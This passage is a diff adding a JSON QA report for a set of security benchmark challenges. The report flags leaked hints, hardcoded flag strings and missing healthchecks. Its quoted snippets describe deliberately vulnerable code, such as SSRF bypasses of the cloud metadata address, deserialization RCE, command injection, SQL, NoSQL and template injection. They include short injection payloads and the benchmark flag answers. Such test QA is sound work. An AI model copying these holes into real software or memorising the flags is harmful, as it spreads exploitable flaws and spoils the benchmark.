+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "description contains potential leak: 'No lockout mechanism allows brute force attacks'"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-014",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-015",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-MED-016",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-001",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 120,
+              "snippet": "# Quick exploitation test"
+            },
+            {
+              "file": "api-service/app.py",
+              "line": 321,
+              "snippet": "# Calculate completion percentage"
+            },
+            {
+              "file": "auth-service/index.js",
+              "line": 210,
+              "snippet": "// Internal debug endpoint (for SSRF discovery)"
+            },
+            {
+              "file": "auth-service/index.js",
+              "line": 214,
+              "snippet": "// But SSRF in api-service can reach it"
+            },
+            {
+              "file": "worker-service/main.go",
+              "line": 167,
+              "snippet": "// STEP 4: Command execution endpoint (VULNERABILITY: Command Injection)"
+            },
+            {
+              "file": "worker-service/main.go",
+              "line": 210,
+              "snippet": "// Allows arbitrary command injection"
+            },
+            {
+              "file": "worker-service/Dockerfile",
+              "line": 12,
+              "snippet": "# Copy source code"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "api-service/templates/index.html",
+              "line": 22,
+              "identifier_like": "exploitation",
+              "snippet": "<li><code class=\"bg-white px-2 py-1 rounded\">GET /api/verify</code> - Verify exploitation</li>"
+            },
+            {
+              "file": "api-service/templates/index.html",
+              "line": 37,
+              "identifier_like": "overflow-auto",
+              "snippet": "<pre id=\"resultContent\" class=\"bg-gray-100 p-4 rounded text-xs overflow-auto max-h-96\"></pre>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "api-service/Dockerfile: ARG flag=no, used=no",
+            "nginx-gateway/Dockerfile: ARG flag=no, used=no",
+            "auth-service/Dockerfile: ARG flag=no, used=no",
+            "worker-service/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-002",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 121,
+              "snippet": "- \"https://portswigger.net/web-security/ssrf\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 123,
+              "snippet": "- \"https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery\""
+            },
+            {
+              "file": "Makefile",
+              "line": 81,
+              "snippet": "exploit: ## Run the automated exploit script"
+            },
+            {
+              "file": "Makefile",
+              "line": 121,
+              "snippet": "# Quick exploitation helpers"
+            },
+            {
+              "file": "Makefile",
+              "line": 122,
+              "snippet": "ssrf-decimal: ## Try SSRF with decimal IP (2852039166 = 169.254.169.254)"
+            },
+            {
+              "file": "Makefile",
+              "line": 128,
+              "snippet": "ssrf-hex: ## Try SSRF with hexadecimal IP (0xa9fea9fe = 169.254.169.254)"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 106,
+              "snippet": "# Convert to lowercase for comparison (VULNERABILITY: case-sensitive bypass)"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 126,
+              "snippet": "# Check if resolves to private IP (VULNERABILITY: timing-based, can bypass with DNS rebinding)"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 134,
+              "snippet": "# VULNERABILITY: Doesn't check for CRLF injection in URL"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 201,
+              "snippet": "# VULNERABILITY: Response size limit can be bypassed with precise path targeting"
+            },
+            {
+              "file": "metadata-service/app.py",
+              "line": 36,
+              "snippet": "# FLAG FOR SSRF CHALLENGE"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 16,
+              "identifier_like": "-strike7-ssrf-secret-key",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-ssrf-secret-key}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 46,
+              "identifier_like": "wjalrxutnfemi/k7mdeng/bpxrficyexamplekey",
+              "snippet": "- AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 62,
+              "identifier_like": "admin_access_via_ssrf_credentials",
+              "snippet": "- FLAG=${FLAG:-S7BEN{admin_access_via_ssrf_credentials}}"
+            },
+            {
+              "file": "admin-panel/index.js",
+              "line": 10,
+              "identifier_like": "admin_access_via_ssrf_credentials",
+              "snippet": "const FLAG = process.env.FLAG || 'SBEN{admin_access_via_ssrf_credentials}';"
+            },
+            {
+              "file": "metadata-service/app.py",
+              "line": 37,
+              "identifier_like": "ssrf_flag",
+              "snippet": "export SSRF_FLAG=S7BEN{{ssrf_metadata_access_169_254_169_254}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "internal-api/Dockerfile: ARG flag=no, used=no",
+            "web-app/Dockerfile: ARG flag=no, used=no",
+            "admin-panel/Dockerfile: ARG flag=no, used=no",
+            "metadata-service/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-003",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "file-server/app.py",
+              "line": 65,
+              "snippet": "# Basic path traversal protection (but not perfect)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 221,
+              "identifier_like": "exploitation",
+              "snippet": "@echo \"$(BLUE)===== SBEN-AD-01 Full Exploitation Test =====$(NC)\""
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "web-app/Dockerfile: ARG flag=no, used=no",
+            "domain-controller/Dockerfile: ARG flag=no, used=no",
+            "file-server/Dockerfile: ARG flag=no, used=no",
+            "database-server/Dockerfile: ARG flag=no, used=no",
+            "workstation/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-004",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 145,
+              "snippet": "url: \"https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\""
+            },
+            {
+              "file": ".gitignore",
+              "line": 18,
+              "snippet": "# Exploit artifacts"
+            },
+            {
+              "file": "web-app/pom.xml",
+              "line": 35,
+              "snippet": "<!-- This version is vulnerable to deserialization attacks -->"
+            },
+            {
+              "file": "web-app/Dockerfile",
+              "line": 9,
+              "snippet": "# Copy source code"
+            },
+            {
+              "file": "web-app/src/main/resources/application.properties",
+              "line": 8,
+              "snippet": "# Disable security for easier exploitation"
+            },
+            {
+              "file": "web-app/src/main/java/com/strike7/webapp/VulnerableController.java",
+              "line": 195,
+              "snippet": "// VULNERABLE: Unsafe deserialization - NO INPUT VALIDATION"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 12,
+              "identifier_like": "java_deserialize_web_rce_a1b2c3d4e5f6",
+              "snippet": "- FLAG_WEB=${FLAG_WEB:-S7BEN{java_deserialize_web_rce_a1b2c3d4e5f6}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 31,
+              "identifier_like": "internal_api_deserialization_g7h8i9j0k1l2",
+              "snippet": "- FLAG_INTERNAL=${FLAG_INTERNAL:-S7BEN{internal_api_deserialization_g7h8i9j0k1l2}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "internal-api/Dockerfile: ARG flag=no, used=no",
+            "web-app/Dockerfile: ARG flag=no, used=no",
+            "victim-app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-005",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 154,
+              "snippet": "url: \"https://davidhamann.de/2020/04/05/exploiting-python-pickle/\""
+            },
+            {
+              "file": ".gitignore",
+              "line": 30,
+              "snippet": "# Exploit scripts (if generated locally)"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 65,
+              "snippet": "# UNSAFE: pickle.loads() on untrusted data enables RCE"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 260,
+              "snippet": "# Flag must be obtained via RCE (reading /app/flag.txt)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 16,
+              "identifier_like": "pickle_session_cookie_rce_f1a2b3c4d5e6",
+              "snippet": "- FLAG_WEB=${FLAG_WEB:-S7BEN{pickle_session_cookie_rce_f1a2b3c4d5e6}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 58,
+              "identifier_like": "c_force_root",
+              "snippet": "- C_FORCE_ROOT=true"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 59,
+              "identifier_like": "celery_worker_task_deserialization_m3n4o5p6q7r8",
+              "snippet": "- FLAG_WORKER=${FLAG_WORKER:-S7BEN{celery_worker_task_deserialization_m3n4o5p6q7r8}}"
+            },
+            {
+              "file": "web-app/app.py",
+              "line": 289,
+              "identifier_like": "pickle_session_cookie_rce_f1a2b3c4d5e6",
+              "snippet": "flag = os.environ.get('FLAG_WEB', 'S7BEN{pickle_session_cookie_rce_f1a2b3c4d5e6}')"
+            },
+            {
+              "file": "worker-service/tasks.py",
+              "line": 106,
+              "identifier_like": "celery_worker_task_deserialization_m3n4o5p6q7r8",
+              "snippet": "flag = os.environ.get('FLAG_WORKER', 'S7BEN{celery_worker_task_deserialization_m3n4o5p6q7r8}')"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "web-app/Dockerfile: ARG flag=no, used=no",
+            "worker-service/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-006",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 140,
+              "snippet": "url: \"https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/\""
+            },
+            {
+              "file": "graphql-api/index.js",
+              "line": 33,
+              "snippet": "// Resolvers with INTENTIONAL SQL INJECTION vulnerabilities"
+            },
+            {
+              "file": "graphql-api/index.js",
+              "line": 48,
+              "snippet": "// CRITICAL VULNERABILITY: SQL Injection in searchUser"
+            },
+            {
+              "file": "graphql-api/index.js",
+              "line": 53,
+              "snippet": "// UNSAFE: Direct string concatenation - SQL INJECTION VULNERABILITY"
+            },
+            {
+              "file": "graphql-api/index.js",
+              "line": 68,
+              "snippet": "// Leaking SQL errors helps attackers understand the injection"
+            },
+            {
+              "file": "graphql-api/index.js",
+              "line": 104,
+              "snippet": "// CRITICAL VULNERABILITY: SQL Injection in getSecret"
+            },
+            {
+              "file": "graphql-api/index.js",
+              "line": 163,
+              "snippet": "// CRITICAL VULNERABILITY: SQL Injection in deleteUser"
+            },
+            {
+              "file": "graphql-api/schema.graphql",
+              "line": 31,
+              "snippet": "# Search users by username - VULNERABLE to SQL injection"
+            },
+            {
+              "file": "graphql-api/schema.graphql",
+              "line": 40,
+              "snippet": "# Get secret by key - VULNERABLE to SQL injection"
+            },
+            {
+              "file": "graphql-api/schema.graphql",
+              "line": 51,
+              "snippet": "# Delete user - VULNERABLE to SQL injection"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 111,
+              "identifier_like": "sqli",
+              "snippet": "location: \"postgres-db.secrets table (flag_key='sqli')\""
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 16,
+              "identifier_like": "flag_sqli",
+              "snippet": "- FLAG_SQLI=${FLAG_SQLI:-S7BEN{graphql_resolver_sql_injection_d4e5f6}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "graphql-api/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-007",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "web-app/Dockerfile",
+              "line": 9,
+              "snippet": "# Copy source code"
+            },
+            {
+              "file": "web-app/src/main/java/com/strike7/xxe/XmlController.java",
+              "line": 129,
+              "snippet": "response.put(\"hint4\", \"http:// protocol can access external resources\");"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "web-app/src/main/java/com/strike7/xxe/XmlController.java",
+              "line": 58,
+              "identifier_like": "inputsource",
+              "snippet": "InputSource inputSource = new InputSource(new StringReader(xmlContent));"
+            },
+            {
+              "file": "web-app/src/main/java/com/strike7/xxe/XmlController.java",
+              "line": 59,
+              "identifier_like": "inputsource",
+              "snippet": "Document document = builder.parse(inputSource);"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "dtd-server/Dockerfile: ARG flag=no, used=no",
+            "internal-api/Dockerfile: ARG flag=no, used=no",
+            "web-app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-008",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 149,
+              "snippet": "url: \"https://owasp.org/www-community/Injection_Flaws#NoSQL_Injection\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 152,
+              "snippet": "url: \"https://book.hacktricks.xyz/pentesting-web/nosql-injection\""
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 155,
+              "snippet": "url: \"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#nosql-injection\""
+            },
+            {
+              "file": "mongo-db/init.js",
+              "line": 72,
+              "snippet": "// Flags will be retrieved through different NoSQL injection techniques"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 43,
+              "snippet": "}, { strict: false }); // VULNERABILITY: strict: false allows injection"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 88,
+              "snippet": "// VULNERABILITY 1: Authentication Bypass via $ne Operator"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 89,
+              "snippet": "// POST /api/login - Vulnerable to NoSQL injection"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 95,
+              "snippet": "// Allows injection of operators like {\"$ne\": null}"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 97,
+              "snippet": "username: username,  // Vulnerable to operator injection"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 98,
+              "snippet": "password: password   // Vulnerable to operator injection"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 104,
+              "snippet": "// Retrieve bypass flag on successful login"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 134,
+              "snippet": "// POST /api/search - Vulnerable to regex injection"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 142,
+              "snippet": "username: username  // Can inject {\"$regex\": \"^a.*\"}"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 160,
+              "snippet": "// VULNERABILITY 3: JavaScript Injection in $where Clause"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 161,
+              "snippet": "// POST /api/query - Vulnerable to $where JavaScript injection"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 169,
+              "snippet": "$where: filter  // Allows injection like \"this.username == 'admin' || '1'=='1'\""
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 172,
+              "snippet": "// If JavaScript injection is successful, return regex flag"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 199,
+              "snippet": "// Advanced $where endpoint for JavaScript injection flag"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 206,
+              "snippet": "$where: condition  // Can inject: \"this.technique == 'where_injection'\""
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 16,
+              "identifier_like": "flag_bypass",
+              "snippet": "- FLAG_BYPASS=${FLAG_BYPASS:-S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}}"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 105,
+              "identifier_like": "bypassflag",
+              "snippet": "const bypassFlag = await Secret.findOne({ id: 'flag_bypass' });"
+            },
+            {
+              "file": "web-app/index.js",
+              "line": 106,
+              "identifier_like": "bypassflag",
+              "snippet": "req.session.flag = bypassFlag ? bypassFlag.flag : null;"
+            },
+            {
+              "file": "web-app/views/index.ejs",
+              "line": 226,
+              "identifier_like": "bypass",
+              "snippet": "<p class=\"subtitle\">SBEN-NOSQL-01: Authentication Bypass & Data Exfiltration</p>"
+            },
+            {
+              "file": "web-app/views/index.ejs",
+              "line": 270,
+              "identifier_like": "injection",
+              "snippet": "<div class=\"endpoint-desc\">Authentication endpoint (vulnerable to $ne operator injection)</div>"
+            },
+            {
+              "file": "web-app/views/index.ejs",
+              "line": 276,
+              "identifier_like": "injection",
+              "snippet": "<div class=\"endpoint-desc\">User search (vulnerable to $regex injection)</div>"
+            },
+            {
+              "file": "web-app/views/index.ejs",
+              "line": 282,
+              "identifier_like": "injection",
+              "snippet": "<div class=\"endpoint-desc\">Advanced query (vulnerable to $where JavaScript injection)</div>"
+            },
+            {
+              "file": "admin-panel/views/admin.ejs",
+              "line": 195,
+              "identifier_like": "injection",
+              "snippet": "<p class=\"subtitle\">SBEN-NOSQL-01: MongoDB NoSQL Injection Benchmark</p>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "web-app/Dockerfile: ARG flag=no, used=no",
+            "admin-panel/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-009",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 152,
+              "snippet": "- https://portswigger.net/research/server-side-template-injection"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 153,
+              "snippet": "- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 154,
+              "snippet": "- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 155,
+              "snippet": "- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"
+            },
+            {
+              "file": "jinja2-app/app.py",
+              "line": 156,
+              "snippet": "# This allows Server-Side Template Injection (SSTI)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "jinja2_ssti_python_rce_a1b2c3d4",
+              "snippet": "- FLAG_JINJA2=${FLAG_JINJA2:-S7BEN{jinja2_ssti_python_rce_a1b2c3d4}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 28,
+              "identifier_like": "nunjucks_ssti_nodejs_rce_e5f6g7h8",
+              "snippet": "- FLAG_NUNJUCKS=${FLAG_NUNJUCKS:-S7BEN{nunjucks_ssti_nodejs_rce_e5f6g7h8}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 46,
+              "identifier_like": "twig_ssti_php_rce_i9j0k1l2",
+              "snippet": "- FLAG_TWIG=${FLAG_TWIG:-S7BEN{twig_ssti_php_rce_i9j0k1l2}}"
+            },
+            {
+              "file": "twig-app/index.php",
+              "line": 9,
+              "identifier_like": "twig_ssti_php_rce_i9j0k1l2",
+              "snippet": "$flagContent = getenv('FLAG_TWIG') ?: 'SBEN{twig_ssti_php_rce_i9j0k1l2}';"
+            },
+            {
+              "file": "twig-app/index.php",
+              "line": 129,
+              "identifier_like": "injection",
+              "snippet": "<p class=\"subtitle\">SBEN-SSTI-01 - Server-Side Template Injection</p>"
+            },
+            {
+              "file": "nunjucks-app/index.js",
+              "line": 128,
+              "identifier_like": "injection",
+              "snippet": "<p class=\"subtitle\">SBEN-SSTI-01 - Server-Side Template Injection</p>"
+            },
+            {
+              "file": "nunjucks-app/index.js",
+              "line": 273,
+              "identifier_like": "nunjucks_ssti_nodejs_rce_e5f6g7h8",
+              "snippet": "const flagContent = process.env.FLAG_NUNJUCKS || 'SBEN{nunjucks_ssti_nodejs_rce_e5f6g7h8}';"
+            },
+            {
+              "file": "jinja2-app/app.py",
+              "line": 115,
+              "identifier_like": "injection",
+              "snippet": "<p class=\"subtitle\">S7BEN-VHARD-009 - Server-Side Template Injection</p>"
+            },
+            {
+              "file": "jinja2-app/app.py",
+              "line": 186,
+              "identifier_like": "jinja2_ssti_python_rce_a1b2c3d4",
+              "snippet": "flag_content = os.environ.get('FLAG_JINJA2', 'S7BEN{jinja2_ssti_python_rce_a1b2c3d4}')"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "twig-app/Dockerfile: ARG flag=no, used=no",
+            "nunjucks-app/Dockerfile: ARG flag=no, used=no",
+            "jinja2-app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-VHARD-010",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "tmpclaude-dc11-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-89a4-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-6b71-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-a18c-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-aa18-cwd",
+              "line": 1,
+              "snippet": "//wsl.localhost/Ubuntu/home/atheeque/workspace/strike7-benchmarks/benchmarks/SBEN-LFI-01"
+            },
+            {
+              "file": "tmpclaude-98ae-cwd",
+              "line": 1,
